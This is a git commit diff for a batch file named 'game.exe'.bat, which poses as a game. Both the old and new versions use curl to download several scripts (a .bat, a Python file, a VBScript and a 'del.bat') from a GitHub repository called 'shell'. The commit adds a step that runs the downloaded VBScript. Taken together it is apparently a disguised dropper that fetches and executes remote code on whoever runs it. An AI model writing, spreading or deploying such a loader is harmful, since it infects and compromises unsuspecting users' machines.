73e294f7a2af4b2aaaeb5beae58d4d0b66f387fb
Omar Samy <osamy7592@gmail.com>
2024-05-01 14:56:22 +0300

    Update 'game.exe'.bat

--- 'game.exe'.bat
+++ 'game.exe'.bat
@@ -1,5 +1,7 @@
 @echo off
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/pro.bat -o D:\pro.bat --silent
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/sh.py -o D:\sh.py --silent
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb.vbs -o D:\vb.vbs --silent
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/del.bat -o D:\del.bat --silent & exit
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/pro.bat -o D:\pro.bat 
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/sh.py -o D:\sh.py 
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb.vbs -o D:\vb.vbs 
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/del.bat -o D:\del.bat
+call vb.vbs
+exit
